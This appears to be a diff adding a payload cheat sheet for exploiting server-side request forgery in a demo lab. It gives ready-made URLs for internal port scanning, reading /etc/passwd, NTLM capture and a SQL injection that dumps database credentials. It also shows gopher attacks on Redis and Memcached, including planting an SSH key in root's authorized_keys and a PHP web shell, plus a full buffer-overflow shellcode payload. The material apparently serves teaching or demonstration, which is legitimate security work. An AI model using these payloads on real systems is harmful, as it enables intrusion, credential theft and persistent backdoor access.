@@ -1,0 +1,149 @@
+##############################################################################################################################
+#######################       DEMO URLS
+##############################################################################################################################
+http://10.0.0.2/ssrf-demo/index-fsockopen-post.php
+http://10.0.0.2/ssrf-demo/index-curl-post.php
+http://10.0.0.2/ssrf-demo/index-curl-get.php?url=
+
+##############################################################################################################################
+#######################       PORT SCANNING
+##############################################################################################################################
+
+http://10.0.0.2/ssrf-demo/index-curl-get.php?url=gopher://localhost:1...65535
+
+http://10.0.0.2/ssrf-demo/index-curl-get.php?url=http://localhost:1...65535
+
+
+##############################################################################################################################
+#######################       FILE DISCLOSURE
+##############################################################################################################################
+
+
+################
+## GET REQUEST :
+
+http://10.0.0.2/ssrf-demo/index-curl-get.php?url=file:///etc/passwd
+
+
+################
+## POST REQUEST:
+
+http://10.0.0.2/ssrf-demo/index-curl-post.php
+
+URL: file:///etc/passwd
+
+
+################
+## SMBRelay on Windows Servers
+
+use auxiliary/server/capture/http_ntlm
+run
+http://10.0.0.2/ssrf-demo/index-curl-get.php?url=http://192.168.170.71:8080/AWjQS2
+
+
+##############################################################################################################################
+#######################       WEBAPP ATTACKS
+##############################################################################################################################
+
+
+################
+## XSS
+http://10.0.0.2/ssrf-demo/index-curl-get.php?url=http://localhost/ssrf-demo/xss.html
+
+
+################
+## SQL Injection
+http://10.0.0.2/ssrf-demo/index-fsockopen-post.php
+Host : localhost
+Port : 80
+URL  : /mutillidae/index.php?page=user-info.php&user-info-php-submit-button=View+Account+Details&username='+union+all+select+1,2,3,concat_ws(0x3a,user,password),5,6,7+from+mysql.user--+&password=+
+
+
+##############################################################################################################################
+#######################       ATTACKING IN MEMORY CACHE/DBS SERVICES
+##############################################################################################################################
+
+
+################
+## POST REQUESTS
+http://10.0.0.2/ssrf-demo/index-curl-post.php
+- Memcached
+URL         : gopher://localhost:11211/+stats%0aquit
+POST data   : nothing
+or
+URL         : http://localhost:11211
+POST data   : stats
+              quit
+- Redis
+URL         : gopher://localhost:6379/+info
+POST data   : nothing
+or
+URL         : http://localhost:6379
+POST data   : info
+
+
+################
+## GET REQUESTS
+--> Redis
+http://10.0.0.2/ssrf-demo/index-curl-get.php?url=gopher://localhost:6379/+info
+
+
+################
+## XSS using Redis
+http://10.0.0.2/ssrf-demo/index-curl-get.php?url=gopher://localhost:6379/+echo+<script>alert(document.domain)</script>
+Or
+URL         : gopher://localhost:6379/+echo+<script>alert(document.domain)</script>
+POST data   : nothing
+Or
+URL         : http://localhost:6379/
+POST data   : echo <script>alert(document.domain)</script>
+
+
+################
+## SSRF and Redis add a SSH pub key and logging
+
+/usr/bin/redis-server /etc/redis/redis.conf
+
+
+ssh-keygen -t rsa
+
+
+ssh -i .ssh/id_rsa.pub root@10.0.0.2
+
+
+http://10.0.0.2/ssrf-demo/index-curl-post.php
+
+URL         : http://localhost:6379
+POST data   :
+
+
+CONFIG SET dir /root/.ssh/
+CONFIG SET dbfilename authorized_keys
+SET payload "
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbtp44HmCeZpW9fFStSuD23uIyTZKpmlg1HqKJkoBVmMZ9A0tXf4N53vg0Xi7o4+PwG3w4Ko9AxHSpxGyIexLazhVFON/SfqIwuTVDR+Wri7SH1aH4s6KEy7PmQY8Agohiq7oMvvYTVFTs1a7vbLtDsVyMb7j9rvhmD0enAyHl65UkwxhD51WHXCtIvXPtgEbnvtXswM/XeOJuhw1Vt51nUKLo8BKYKwqtb+Pa7lmTmHJf36tmOwXI3FKVjzA6AsKUzT3HhlC9NFFAvuJ6kjOfR6mqerQnE5wXLo40R3JhMziv9bypdsT47Cvs/tE72GjcPw+81lTG68pYW+1O31sl ricardoalmeida@darrtah
+"
+BGSAVE
+
+
+CONFIG SET dir /var/www/html/
+CONFIG SET dbfilename backdoor.php
+SET payload ' <?php print("computer says nooooo..."); system("uname -a"); ?> '
+BGSAVE
+
+
+
+##############################################################################################################################
+#######################       EXPLOITING BUFFER OVERFLOWS
+##############################################################################################################################
+
+
+#### Generate shellcode url encoded with xxd
+
+msfvenom -b '\x0d\x0c\x0a\x00\20' -a x86 --platform windows -p windows/exec CMD=calc.exe -e x86/shikata_ga_nai -f raw | xxd -plain | tr -d '\n' | sed 's/\(..\)/%\1/g'
+
+
+Use Chrome/Firefox
+
+Or
+
+curl 'http://10.0.0.2/ssrf-demo/index-curl-get.php?url=gopher://192.168.254.1:9999/%20TRUN%20.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB%af%11%50%62%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%90%ba%ad%e3%34%fe%d9%e1%d9%74%24%f4%5e%2b%c9%b1%31%31%56%13%83%ee%fc%03%56%a2%01%c1%02%54%47%2a%fb%a4%28%a2%1e%95%68%d0%6b%85%58%92%3e%29%12%f6%aa%ba%56%df%dd%0b%dc%39%d3%8c%4d%79%72%0e%8c%ae%54%2f%5f%a3%95%68%82%4e%c7%21%c8%fd%f8%46%84%3d%72%14%08%46%67%ec%2b%67%36%67%72%a7%b8%a4%0e%ee%a2%a9%2b%b8%59%19%c7%3b%88%50%28%97%f5%5d%db%e9%32%59%04%9c%4a%9a%b9%a7%88%e1%65%2d%0b%41%ed%95%f7%70%22%43%73%7e%8f%07%db%62%0e%cb%57%9e%9b%ea%b7%17%df%c8%13%7c%bb%71%05%d8%6a%8d%55%83%d3%2b%1d%29%07%46%7c%27%d6%d4%fa%05%d8%e6%04%39%b1%d7%8f%d6%c6%e7%45%93%39%a2%c4%b5%d1%6b%9d%84%bf%8b%4b%ca%b9%0f%7e%b2%3d%0f%0b%b7%7a%97%e7%c5%13%72%08%7a%13%57%6b%1d%87%3b%42%b8%2f%d9%9a'
